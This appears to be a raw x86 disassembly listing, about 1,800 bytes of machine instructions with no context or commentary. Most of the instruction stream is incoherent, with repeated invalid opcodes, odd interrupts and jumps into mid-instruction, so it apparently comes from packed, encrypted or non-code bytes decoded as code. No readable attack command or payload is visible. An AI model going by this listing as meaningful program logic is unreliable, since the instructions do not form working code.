  425b71:	(bad)  
  425b72:	inc    esp
  425b73:	mov    ebp,0xfb94
  425b78:	int    0x76
  425b7a:	lods   eax,DWORD PTR ds:[esi]
  425b7b:	int    0x8d
  425b7d:	mov    ch,0x2f
  425b7f:	inc    ebp
  425b80:	jge    0x425b14
  425b82:	shr    ebx,cl
  425b84:	xchg   edx,eax
  425b85:	int    0x8d
  425b87:	lods   eax,DWORD PTR ds:[esi]
  425b88:	int    0x96
  425b8a:	mov    ch,0x3b
  425b8c:	leave  
  425b8d:	cmp    ebx,edx
  425b8f:	push   ebx
  425b90:	icebp  
  425b91:	bound  eax,QWORD PTR [eax]
  425b93:	(bad)  
  425b94:	push   esp
  425b95:	shl    edx,cl
  425b97:	sub    BYTE PTR [eax],al
  425b99:	(bad)  
  425b9a:	cmp    al,0xbd
  425b9c:	inc    esp
  425b9d:	sti    
  425b9e:	add    BYTE PTR [eax],al
  425ba0:	int    0x76
  425ba2:	std    
  425ba3:	int    0x8d
  425ba5:	std    
  425ba6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425ba9:	repnz sub BYTE PTR [ebx],bh
  425bac:	jns    0x425b81
  425bae:	mov    ebp,0xcdd35392
  425bb3:	(bad)  
  425bb4:	std    
  425bb5:	int    0x96
  425bb7:	std    
  425bb8:	cmp    ecx,DWORD PTR [edi]
  425bba:	shr    ebx,cl
  425bbc:	xchg   edx,eax
  425bbd:	cmp    edx,ebp
  425bbf:	shr    edx,cl
  425bc1:	sub    BYTE PTR [ebx+0x13],dl
  425bc4:	xchg   ebx,edx
  425bc6:	int    0x8d
  425bc8:	std    
  425bc9:	int    0x96
  425bcb:	std    
  425bcc:	cmp    ecx,DWORD PTR [edi]
  425bce:	shr    ebx,cl
  425bd0:	xchg   edx,eax
  425bd1:	cmp    edx,ebp
  425bd3:	shr    edx,cl
  425bd5:	sub    BYTE PTR [ebx+0x13],dl
  425bd8:	xchg   ebx,edx
  425bda:	int    0x8d
  425bdc:	std    
  425bdd:	int    0x96
  425bdf:	std    
  425be0:	cmp    ecx,DWORD PTR [edi]
  425be2:	shr    ebx,cl
  425be4:	xchg   edx,eax
  425be5:	cmp    edx,ebp
  425be7:	shr    edx,cl
  425be9:	sub    BYTE PTR [ebx+0x13],dl
  425bec:	xchg   ebx,edx
  425bee:	or     al,BYTE PTR [esi]
  425bf0:	nop
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ch,cl
  425bf5:	jbe    0x425c4b
  425bf7:	int    0x80
  425bf9:	int    0x8d
  425bfb:	mov    ebp,0x3bbd96cd
  425c00:	(bad)  
  425c02:	aad    0xd3
  425c04:	jmp    0x425b98
  425c06:	shr    edx,cl
  425c08:	sub    BYTE PTR [ebx+0x13],dl
  425c0b:	or     al,BYTE PTR ds:0xd4cf
  425c11:	add    ch,cl
  425c13:	jbe    0x425c61
  425c15:	int    0x80
  425c17:	int    0x8d
  425c19:	std    
  425c1a:	int    0x96
  425c1c:	std    
  425c1d:	cmp    ecx,DWORD PTR [edi]
  425c1f:	shr    ebx,cl
  425c21:	xchg   edx,eax
  425c22:	int    0x6c
  425c24:	jo     0x425c61
  425c26:	aad    0xd3
  425c28:	jmp    0xcf05:0xa135328
  425c2f:	aam    0x0
  425c31:	add    BYTE PTR [eax],al
  425c33:	int    0x76
  425c35:	sbb    al,0xcd
  425c37:	lea    ebx,[ebx+edi*1]
  425c3a:	or     al,0xd3
  425c3c:	repnz sub BYTE PTR [ebx],bh
  425c3f:	jns    0x425c14
  425c41:	mov    ebp,0xcdd35392
  425c46:	(bad)  
  425c47:	std    
  425c48:	int    0x96
  425c4a:	std    
  425c4b:	cmp    edx,ebp
  425c4d:	cmp    ecx,DWORD PTR [edi]
  425c4f:	shr    edx,cl
  425c51:	sub    bl,dl
  425c53:	jmp    0x425be7
  425c55:	push   ebx
  425c56:	adc    ecx,ebp
  425c58:	xchg   esi,eax
  425c59:	std    
  425c5a:	int    0xa6
  425c5c:	std    
  425c5d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c63:	hlt    
  425c64:	call   ebx
  425c66:	in     eax,0x28
  425c68:	push   ebx
  425c69:	aad    0x87
  425c6b:	adc    ecx,DWORD PTR [edx]
  425c6d:	add    eax,0xd4cf
  425c72:	add    ch,cl
  425c74:	jbe    0x425c73
  425c76:	int    0x8d
  425c78:	std    
  425c79:	add    al,0x2
  425c7b:	call   ebx
  425c7d:	repnz sub BYTE PTR [ebx],bh
  425c80:	jns    0x425c55
  425c82:	mov    ebp,0xcdd35392
  425c87:	(bad)  
  425c88:	std    
  425c89:	int    0x96
  425c8b:	std    
  425c8c:	add    al,0xfb
  425c8e:	(bad)  
  425c8f:	cmp    ecx,DWORD PTR [edi]
  425c91:	shr    edx,cl
  425c93:	sub    bl,dl
  425c95:	jmp    0x425c29
  425c97:	push   ebx
  425c98:	adc    eax,DWORD PTR [edi-0x272322d]
  425c9e:	int    0x96
  425ca0:	std    
  425ca1:	add    al,0xfb
  425ca3:	(bad)  
  425ca4:	cmp    ecx,DWORD PTR [edi]
  425ca6:	shr    edx,cl
  425ca8:	sub    bl,dl
  425caa:	jmp    0x425c3e
  425cac:	push   ebx
  425cad:	adc    ecx,edi
  425caf:	pop    ss
  425cb0:	nop
  425cb1:	add    BYTE PTR [eax],al
  425cb3:	add    BYTE PTR [edx-0x33],ah
  425cb6:	xchg   esi,eax
  425cb7:	std    
  425cb8:	int    0xa6
  425cba:	std    
  425cbb:	xchg   ebx,edx
  425cbd:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425cc3:	int3   
  425cc4:	push   es
  425cc5:	aam    0x0
  425cc7:	add    BYTE PTR [eax],al
  425cc9:	int    0x76
  425ccb:	sub    al,0x4
  425ccd:	hlt    
  425cce:	call   ebx
  425cd0:	repz xchg edx,eax
  425cd2:	shl    ebp,cl
  425cd4:	sub    BYTE PTR [ebx-0x2b],dl
  425cd7:	iret   
  425cd8:	or     edi,ebp
  425cda:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425ce1:	add    BYTE PTR [eax+0x50007162],0x0
  425ce8:	xchg   esi,eax
  425ce9:	and    al,0x6
  425ceb:	ins    DWORD PTR es:[edi],dx
  425cec:	aam    0xbc
  425cee:	int    0x76
  425cf0:	in     eax,dx
  425cf1:	int    0x8d
  425cf3:	adc    DWORD PTR [edi],ebp
  425cf5:	inc    ebp
  425cf6:	jge    0x425c8a
  425cf8:	shr    ebx,cl
  425cfa:	xchg   edx,eax
  425cfb:	int    0xe3
  425cfd:	int    0x7d
  425cff:	int    0x76
  425d01:	in     eax,dx
  425d02:	int    0x96
  425d04:	adc    DWORD PTR [ebx],edi
  425d06:	fidivr DWORD PTR [ebx]
  425d08:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d0f:	push   ebx
  425d10:	adc    ecx,ebp
  425d12:	xor    BYTE PTR [ebx-0x76],al
  425d15:	jo     0x425ce4
  425d17:	xchg   esi,eax
  425d18:	push   esp
  425d19:	in     al,dx
  425d1a:	push   esp
  425d1b:	int    0x92
  425d1d:	int    0xa6
  425d1f:	push   eax
  425d20:	retf   0x5324
  425d23:	or     DWORD PTR [eax+ecx*4],esp
  425d26:	int    0x76
  425d28:	cmc    
  425d29:	int    0x8d
  425d2b:	stc    
  425d2c:	das    
  425d2d:	inc    ebp
  425d2e:	jge    0x425cc2
  425d30:	shr    ebx,cl
  425d32:	xchg   edx,eax
  425d33:	int    0x8d
  425d35:	cmc    
  425d36:	int    0xa6
  425d38:	stc    
  425d39:	cmp    ecx,ecx
  425d3b:	cmp    ebx,ebp
  425d3d:	shl    edx,cl
  425d3f:	sub    ch,cl
  425d41:	lea    esi,[eax]
  425d43:	push   ebx
  425d44:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d4a:	int    0x1c
  425d4c:	inc    ebx
  425d4d:	(bad)  
  425d4e:	jo     0x425d5a
  425d50:	lea    esi,[eax]
  425d52:	or     cl,0xec
  425d55:	xchg   ch,cl
  425d57:	xchg   esi,eax
  425d58:	push   esp
  425d59:	int    0x76
  425d5b:	dec    esp
  425d5c:	int    0x4a
  425d5e:	int    0x20
  425d60:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d66:	sbb    al,0xcd
  425d68:	dec    edx
  425d69:	xchg   ebp,ecx
  425d6b:	sub    eax,0xa808080
  425d70:	lea    esi,[eax]
  425d72:	int    0x4a
  425d74:	int    0xa6
  425d76:	push   eax
  425d77:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d7e:	int    0x80
  425d80:	int    0x4a
  425d82:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425d86:	jbe    0x425d75
  425d88:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425d8e:	das    
  425d8f:	inc    ebp
  425d90:	jge    0x425d24
  425d92:	shr    ebx,cl
  425d94:	xchg   edx,eax
  425d95:	int    0x8d
  425d97:	in     eax,dx
  425d98:	int    0xa6
  425d9a:	adc    DWORD PTR [ebx],edi
  425d9c:	leave  
  425d9d:	cmp    ebx,ebp
  425d9f:	shl    edx,cl
  425da1:	sub    BYTE PTR [ebx-0x3b],dl
  425da4:	or     dh,BYTE PTR [esi+0x44]
  425da7:	int    0x76
  425da9:	xor    bl,ch
  425dab:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425db1:	in     eax,dx
  425db2:	int    0x8d
  425db4:	adc    DWORD PTR [edi],ebp
  425db6:	inc    ebp
  425db7:	jge    0x425d4b
  425db9:	shr    ebx,cl
  425dbb:	xchg   edx,eax
  425dbc:	int    0x8d
  425dbe:	in     eax,dx
  425dbf:	int    0xa6
  425dc1:	adc    ebx,edx
  425dc3:	repnz sub ch,cl
  425dc6:	lea    edx,[ebx+edi*1]
  425dc9:	leave  
  425dca:	cmp    ebx,ebp
  425dcc:	add    al,0xd3
  425dce:	stc    
  425dcf:	push   ebx
  425dd0:	(bad)
  425dd3:	inc    ebx
  425dd4:	shr    DWORD PTR [edi],cl
  425dd6:	add    al,0xf7
  425dd8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425de0:	dec    ebx
  425de1:	mov    BYTE PTR [ebx],dh
  425de3:	jge    0x425def
  425de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425de6:	xor    al,0xa
  425de8:	lea    edi,[ecx*8+0x76cdf18d]
  425def:	xchg   ebp,eax
  425df0:	das    
  425df1:	inc    ebp
  425df2:	rcl    DWORD PTR [edx-0x326d422d],cl
  425df8:	jbe    0x425deb
  425dfa:	int    0xa6
  425dfc:	xchg   ebp,eax
  425dfd:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e03:	cmp    esi,eax
  425e05:	cmp    ebx,ebp
  425e07:	push   ebx
  425e08:	or     al,0xcd
  425e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e0b:	stc    
  425e0c:	das    
  425e0d:	inc    ebp
  425e0e:	popf   
  425e0f:	xchg   edx,eax
  425e10:	or     dh,BYTE PTR [esi+0x54]
  425e13:	int    0x76
  425e15:	cmc    
  425e16:	push   ecx
  425e17:	out    0x54,al
  425e19:	add    al,0xd3
  425e1b:	dec    edx
  425e1c:	shr    esp,cl
  425e1e:	xchg   edx,eax
  425e1f:	int    0xa6
  425e21:	stc    
  425e22:	cmp    ebx,ebp
  425e24:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e2a:	int    0xa6
  425e2c:	cmc    
  425e2d:	int    0x8d
  425e2f:	stc    
  425e30:	das    
  425e31:	inc    ebp
  425e32:	or     al,0x92
  425e34:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e3a:	shr    ebx,cl
  425e3c:	xchg   edx,eax
  425e3d:	int    0x8d
  425e3f:	stc    
  425e40:	cmp    ecx,ebx
  425e42:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e48:	cmp    esp,ecx
  425e4a:	push   ebx
  425e4b:	fcmovne st,st(5)
  425e4d:	lea    esi,[edi+ebp*1]
  425e50:	mov    ebx,0x2bc53389
  425e55:	ror    ebp,cl
  425e57:	(bad)  
  425e58:	icebp  
  425e59:	or     dh,BYTE PTR [esi+0x54]
  425e5c:	int    0x76
  425e5e:	xchg   ebp,eax
  425e5f:	das    
  425e60:	inc    ebp
  425e61:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e67:	jbe    0x425e5a
  425e69:	int    0xa6
  425e6b:	xchg   ebp,eax
  425e6c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e72:	das    
  425e73:	mov    ebx,0xa6020180
  425e78:	cmp    ebx,ebp
  425e7a:	dec    edx
  425e7b:	or     al,0x1
  425e7d:	ror    DWORD PTR [edx-0x2b],cl
  425e80:	mov    ebp,0xbdbfcb3b
  425e85:	or     ah,BYTE PTR [ebx]
  425e87:	and    eax,0x92d3352f
  425e8c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425e92:	ficom  WORD PTR [ebx]
  425e94:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425e97:	fidiv  WORD PTR [edi]
  425e99:	ficom  WORD PTR [ebx]
  425e9b:	(bad)  
  425e9c:	ss inc ebx
  425e9e:	or     al,0xd6
  425ea0:	cs int 0x92
  425ea3:	int    0x8d
  425ea5:	xor    BYTE PTR [edi+0x548dcd81],al
  425eab:	add    al,0x64
  425ead:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425eb3:	int    0x8d
  425eb5:	xor    BYTE PTR [edi-0x7772327f],al
  425ebb:	xchg   DWORD PTR [esi+0x54],esi
  425ebe:	int    0x89
  425ec0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eca:	push   es
  425ecb:	and    eax,DWORD PTR [eax]
  425ecd:	add    BYTE PTR [eax],al
  425ecf:	in     al,dx
  425ed0:	test   DWORD PTR [edi+0x25230abd],edi
  425ed6:	int    0x76
  425ed8:	adc    al,0x81
  425eda:	jbe    0x425f20
  425edc:	leave  
  425edd:	jbe    0x425f4c
  425edf:	scas   al,BYTE PTR es:[edi]
  425ee0:	aaa    
  425ee1:	ficom  WORD PTR [ebx]
  425ee3:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425ee9:	int    0x8d
  425eeb:	jne    0x425f1c
  425eed:	inc    ebp
  425eee:	jge    0x425e82
  425ef0:	shr    ebx,cl
  425ef2:	xchg   edx,eax
  425ef3:	int    0x8d
  425ef5:	ins    DWORD PTR es:[edi],dx
  425ef6:	int    0xa6
  425ef8:	jne    0x425ecd
  425efa:	repnz sub ch,cl
  425efd:	lea    ecx,[ebp+ecx*8-0x77]
  425f01:	cmp    ecx,ecx
  425f03:	cmp    ebx,ebp
  425f05:	push   ebx
  425f06:	(bad)
  425f09:	shl    esp,cl
  425f0b:	int    0x8d
  425f0d:	inc    esp
  425f0e:	inc    ebx
  425f0f:	mov    BYTE PTR [edi+0x54],dh
  425f12:	int    0x76
  425f14:	xor    BYTE PTR [edi+0x760a1476],al
  425f1a:	xor    ch,cl
  425f1c:	ins    BYTE PTR es:[edi],dx
  425f1d:	test   BYTE PTR [edx],cl
  425f1f:	jbe    0x425f35
  425f21:	int    0x76
  425f23:	in     eax,dx
  425f24:	int    0x8d
  425f26:	adc    DWORD PTR [edi],ebp
  425f28:	inc    ebp
  425f29:	jge    0x425ebd
  425f2b:	shr    ebx,cl
  425f2d:	xchg   edx,eax
  425f2e:	int    0x8d
  425f30:	in     eax,dx
  425f31:	int    0xa6
  425f33:	adc    DWORD PTR [ebx],edi
  425f35:	fnstsw WORD PTR [ebx]
  425f37:	leave  
  425f38:	push   ebx
  425f39:	(bad)
  425f3c:	sub    BYTE PTR [esi+0x76],bl
  425f3f:	adc    al,0x2f
  425f41:	push   es
  425f42:	mov    esi,0xcd0000ff
  425f47:	(bad)  
  425f48:	std    
  425f49:	int    0x96
  425f4b:	std    
  425f4c:	cmp    ecx,DWORD PTR [edi]
  425f4e:	shr    ebx,cl
  425f50:	xchg   edx,eax
  425f51:	sar    bh,0x9c
  425f54:	cmp    esi,ecx
  425f56:	shr    edx,cl
  425f58:	sub    BYTE PTR [ebx+0x13],dl
  425f5b:	int    0x96
  425f5d:	std    
  425f5e:	int    0xa6
  425f60:	std    
  425f61:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f67:	popf   
  425f68:	shl    ebp,cl
  425f6a:	sub    BYTE PTR [ebx-0x2b],dl
  425f6d:	xchg   DWORD PTR [ebx],edx
  425f6f:	int    0x96
  425f71:	std    
  425f72:	int    0xa6
  425f74:	std    
  425f75:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f7b:	popf   
  425f7c:	shl    ebp,cl
  425f7e:	sub    BYTE PTR [ebx-0x2b],dl
  425f81:	xchg   DWORD PTR [ebx],edx
  425f83:	int    0x96
  425f85:	std    
  425f86:	int    0xa6
  425f88:	std    
  425f89:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425f8f:	xchg   edx,eax
  425f90:	shl    ebp,cl
  425f92:	sub    BYTE PTR [ebx-0x2b],dl
  425f95:	xchg   DWORD PTR [ebx],edx
  425f97:	or     cl,bh
  425f99:	nop
  425f9a:	add    BYTE PTR [eax],al
  425f9c:	add    ch,cl
  425f9e:	lea    edx,[eax-0x33]
  425fa1:	xchg   esi,eax
  425fa2:	mov    ebp,0x3bbda6cd
  425fa7:	cdq    
  425fa8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fae:	in     eax,0x28
  425fb0:	push   ebx
  425fb1:	aad    0xa
  425fb3:	int3   
  425fb4:	pop    ss
  425fb5:	aam    0x0
  425fb7:	add    BYTE PTR [eax],al
  425fb9:	int    0x8d
  425fbb:	dec    esp
  425fbc:	int    0x89
  425fbe:	int    0x96
  425fc0:	std    
  425fc1:	int    0xa6
  425fc3:	std    
  425fc4:	int    0x7e
  425fc6:	jo     0x426003
  425fc8:	cdq    
  425fc9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fcf:	in     eax,0x28
  425fd1:	push   ebx
  425fd2:	aad    0xa
  425fd4:	int3   
  425fd5:	pop    ss
  425fd6:	aam    0x0
  425fd8:	add    BYTE PTR [eax],al
  425fda:	int    0x8d
  425fdc:	sbb    al,0xcd
  425fde:	xchg   esi,eax
  425fdf:	sbb    al,0x3b
  425fe1:	icebp  
  425fe2:	shr    edx,cl
  425fe4:	sub    BYTE PTR [ebx],bh
  425fe6:	psrlq  mm5,mm3
  425fe9:	xchg   edx,eax
  425fea:	push   ebx
  425feb:	adc    ecx,ebp
  425fed:	xchg   esi,eax
  425fee:	std    
  425fef:	int    0xa6
  425ff1:	std    
  425ff2:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ff8:	cdq    
  425ff9:	shl    ebp,cl
  425ffb:	sub    bl,dl
  425ffd:	repz xchg edx,eax
  425fff:	push   ebx
  426000:	aad    0xcd
  426002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426003:	std    
  426004:	cmp    edi,DWORD PTR [ecx+0x4]
  426007:	hlt    
  426008:	call   ebx
  42600a:	mov    ebp,0x28e5d392
  42600f:	push   ebx
  426010:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426016:	aam    0x0
  426018:	add    BYTE PTR [eax],al
  42601a:	int    0x8d
  42601c:	std    
  42601d:	int    0x96
  42601f:	std    
  426020:	cmp    ecx,DWORD PTR [edi]
  426022:	shr    ebx,cl
  426024:	xchg   edx,eax
  426025:	sar    bh,0x9c
  426028:	cmp    esi,ecx
  42602a:	shr    edx,cl
  42602c:	sub    BYTE PTR [ebx+0x13],dl
  42602f:	int    0x96
  426031:	std    
  426032:	int    0xa6
  426034:	std    
  426035:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42603b:	popf   
  42603c:	shl    ebp,cl
  42603e:	sub    BYTE PTR [ebx-0x2b],dl
  426041:	xchg   DWORD PTR [ebx],edx
  426043:	int    0x96
  426045:	std    
  426046:	int    0xa6
  426048:	std    
  426049:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42604f:	popf   
  426050:	shl    ebp,cl
  426052:	sub    BYTE PTR [ebx-0x2b],dl
  426055:	xchg   DWORD PTR [ebx],edx
  426057:	iret   
  426058:	xchg   esi,eax
  426059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42605a:	or     dl,BYTE PTR ds:0xd4cf
  426060:	add    bh,cl
  426062:	iret   
  426063:	nop
  426064:	add    BYTE PTR [eax],al
  426066:	add    BYTE PTR [ecx-0x33],dh
  426069:	(bad)  
  42606a:	std    
  42606b:	int    0x96
  42606d:	std    
  42606e:	cmp    ecx,DWORD PTR [edi]
  426070:	int    0xd6
  426072:	sub    al,0x3b
  426074:	icebp  
  426075:	shr    ebx,cl
  426077:	xchg   edx,eax
  426078:	shr    edx,cl
  42607a:	sub    BYTE PTR [ebx+0x13],dl
  42607d:	jno    0x42604e
  42607f:	pop    es
  426080:	out    dx,eax
  426081:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426088:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426092:	add    DWORD PTR [ecx+0x760a8080],eax
  426098:	dec    esp
  426099:	int    0x76
  42609b:	mov    ch,cl
  42609d:	mov    BYTE PTR [edi-0x72f5b373],al
  4260a3:	dec    esp
  4260a4:	int    0x8d
  4260a6:	cmc    
  4260a7:	int    0x96
  4260a9:	stc    
  4260aa:	das    
  4260ab:	inc    ebp
  4260ac:	jecxz  0x426040
  4260ae:	shl    ebx,cl
  4260b0:	xchg   edx,eax
  4260b1:	int    0x96
  4260b3:	cmc    
  4260b4:	int    0xd6
  4260b6:	stc    
  4260b7:	cmp    esi,edi
  4260b9:	shr    edx,cl
  4260bb:	sub    ch,cl
  4260bd:	xchg   esi,eax
  4260be:	cmc    
  4260bf:	cmp    esi,eax
  4260c1:	push   ebx
  4260c2:	bswap  ebp
  4260c4:	(bad)  
  4260c5:	stc    
  4260c6:	das    
  4260c7:	inc    ebp
  4260c8:	sti    
  4260c9:	xchg   edx,eax
  4260ca:	shr    edi,cl
  4260cc:	xchg   edx,eax
  4260cd:	int    0xd6
  4260cf:	cmc    
  4260d0:	int    0xa6
  4260d2:	stc    
  4260d3:	cmp    ebx,ecx
  4260d5:	cmp    ebx,ebp
  4260d7:	push   ebx
  4260d8:	aad    0x87
  4260da:	adc    ecx,ebp
  4260dc:	xchg   esi,eax
  4260dd:	cmc    
  4260de:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260e4:	das    
  4260e5:	inc    ebp
  4260e6:	sti    
  4260e7:	xchg   edx,eax
  4260e8:	shr    edi,cl
  4260ea:	xchg   edx,eax
  4260eb:	int    0xd6
  4260ed:	cmc    
  4260ee:	int    0xa6
  4260f0:	stc    
  4260f1:	cmp    ebx,ecx
  4260f3:	cmp    ebx,ebp
  4260f5:	push   ebx
  4260f6:	aad    0x87
  4260f8:	adc    ecx,ebp
  4260fa:	xchg   esi,eax
  4260fb:	cmc    
  4260fc:	sar    DWORD PTR [ecx-0x62932d8],cl
  426102:	das    
  426103:	inc    ebp
  426104:	sti    
  426105:	xchg   edx,eax
  426106:	shr    edi,cl
  426108:	xchg   edx,eax
  426109:	int    0xd6
  42610b:	cmc    
  42610c:	cmp    ebx,ecx
  42610e:	int    0xe6
  426110:	stc    
  426111:	cmp    eax,DWORD PTR [eax]
  426113:	push   ebx
  426114:	fld    DWORD PTR [edi+0x707113]
  42611a:	(bad)  
  42611b:	dec    esp
  42611c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426122:	add    BYTE PTR [eax],al
  426124:	int    0x76
  426126:	or     eax,0xcb63a8aa
  42612b:	rcl    BYTE PTR [eax-0x80],cl
  42612e:	xchg   esi,eax
  42612f:	int    0xed
  426131:	add    al,0xed
  426133:	inc    esp
  426134:	pop    ebx
  426135:	cwde   
  426136:	call   0x76c9:0xcb3bdd3b
  42613d:	popf   
  42613e:	(bad)  
  42613f:	aaa    
  426140:	ficom  WORD PTR [ebx]
  426142:	pop    ebp
  426143:	mov    ebp,0xa25230a
  426148:	jbe    0x4260ef
  42614a:	leave  
  42614b:	jbe    0x42610a
  42614d:	xchg   ecx,eax
  42614e:	aaa    
  42614f:	ficom  WORD PTR [ebx]
  426151:	or     dh,BYTE PTR [esi-0x13]
  426154:	leave  
  426155:	jbe    0x426144
  426157:	dec    ecx
  426158:	mov    al,ds:0x76c93586
  42615d:	cmc    
  42615e:	dec    ecx
  42615f:	lahf   
  426160:	xchg   BYTE PTR ds:0x691176c9,dh
  426166:	and    DWORD PTR [esi+0x1176c935],eax
  42616c:	cmp    DWORD PTR [ecx],esp
  42616e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426174:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42617b:	jbe    0x426176
  42617d:	int    0x76
  42617f:	sbb    al,0xcd
  426181:	shl    BYTE PTR ds:0xcd808081,1
  426187:	jbe    0x4261a5
  426189:	int    0x8d
  42618b:	sbb    al,0xcd
  42618d:	add    DWORD PTR ds:0xcd808081,ebp
  426193:	xor    ch,cl
  426195:	pop    esp
  426196:	xchg   eax,esp
  426198:	fs int 0x96
  42619b:	popf   
  42619c:	int    0xa
  42619e:	and    eax,0xa808081
  4261a3:	out    0xb5,al
  4261a5:	int    0xe6
  4261a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a8:	das    
  4261a9:	inc    ebp
  4261aa:	add    edx,DWORD PTR [edx-0x326def2d]
  4261b0:	out    0x9d,al
  4261b2:	int    0xa6
  4261b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261b5:	adc    bh,bl
  4261b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261b8:	mov    esi,0xdd3b4229
  4261bd:	shr    ecx,cl
  4261bf:	sub    ch,cl
  4261c1:	pop    esi
  4261c2:	push   ebx
  4261c3:	aad    0x43
  4261c5:	(bad)  
  4261c7:	nop
  4261c8:	int    0x18
  4261ca:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261d0:	int    0x96
  4261d2:	xor    ch,cl
  4261d4:	xchg   esi,eax
  4261d5:	dec    esp
  4261d6:	iret   
  4261d7:	xchg   esi,eax
  4261d8:	lods   eax,DWORD PTR ds:[esi]
  4261d9:	bound  eax,QWORD PTR [eax]
  4261db:	(bad)  
  4261dc:	stc    
  4261dd:	jno    0x42624f
  4261df:	cwde   
  4261e0:	add    dh,dl
  4261e2:	sbb    al,0xcf
  4261e4:	jbe    0x42619b
  4261e6:	add    dh,dl
  4261e8:	mov    BYTE PTR [eax],al
  4261ea:	(bad)  
  4261eb:	cmc    
  4261ec:	add    dh,dl
  4261ee:	adc    DWORD PTR [eax],eax
  4261f0:	(bad)  
  4261f1:	in     eax,dx
  4261f2:	jo     0x4261c3
  4261f4:	jbe    0x4261f3
  4261f6:	jo     0x4261b5
  4261f8:	stos   BYTE PTR es:[edi],al
  4261f9:	clc    
  4261fa:	add    BYTE PTR [eax],al
  4261fc:	or     dh,BYTE PTR [esi+0x1c]
  4261ff:	int    0x76
  426201:	sbb    al,0xcd
  426203:	lea    esp,[edx+ecx*1]
  426206:	outs   dx,BYTE PTR ds:[esi]
  426207:	adc    al,0xcd
  426209:	jbe    0x42622f
  42620b:	leave  
  42620c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426213:	lods   eax,DWORD PTR ds:[esi]
  426214:	int    0x8d
  426216:	and    al,0xa
  426218:	outs   dx,BYTE PTR ds:[esi]
  426219:	test   ch,cl
  42621b:	jbe    0x42624d
  42621d:	int    0x8d
  42621f:	and    al,0xa
  426221:	outs   dx,BYTE PTR ds:[esi]
  426222:	mov    ch,cl
  426224:	jbe    0x42623a
  426226:	int    0x8d
  426228:	and    al,0xa
  42622a:	outs   dx,BYTE PTR ds:[esi]
  42622b:	dec    esp
  42622c:	int    0x76
  42622e:	and    al,0xc9
  426230:	ins    BYTE PTR es:[edi],dx
  426231:	and    al,0x81
  426233:	add    BYTE PTR [eax-0x32e11380],0x76
  42623a:	sbb    al,0xcd
  42623c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426243:	or     ch,0xa
  426246:	and    eax,0xcd808081
  42624b:	xor    BYTE PTR [ebx],0x81
  42624e:	or     dh,BYTE PTR [esi-0x3]
  426251:	int    0x76
  426253:	std    
  426254:	stos   BYTE PTR es:[edi],al
  426255:	test   al,0x63
  426257:	retf   
  426258:	rcr    BYTE PTR [eax+eax*4],cl
  42625b:	xchg   esi,eax
  42625c:	int    0xed
  42625e:	int    0x76
  426260:	dec    esp
  426261:	adc    ch,ch
  426263:	cmp    eax,0x5b808081
  426268:	cwde   
  426269:	call   0x2f35:0x86214966
  426270:	push   es
  426271:	mov    ecx,0xcd80804a
  426276:	jbe    0x4262a8
  426278:	inc    cx
  42627a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426280:	dec    edx
  426281:	add    BYTE PTR [eax-0x29128937],0x37
  426288:	ficom  WORD PTR [ebx]
  42628a:	pop    ebp
  42628b:	mov    ebp,0xa25230a
  426290:	jbe    0x4262a3
  426292:	leave  
  426293:	jbe    0x42624a
  426295:	xchg   ecx,eax
  426296:	aaa    
  426297:	ficom  WORD PTR [ebx]
  426299:	or     dh,BYTE PTR [esi-0x43]
  42629c:	int    0x76
  42629e:	mov    BYTE PTR [edx],cl
  4262a0:	jbe    0x426297
  4262a2:	int    0x76
  4262a4:	cmc    
  4262a5:	int    0x1
  4262a7:	mov    ebp,0xcd808081
  4262ac:	or     ch,0x80
  4262af:	or     dh,BYTE PTR [esi-0x7]
  4262b2:	pop    edi
  4262b3:	jle    0x4262ea
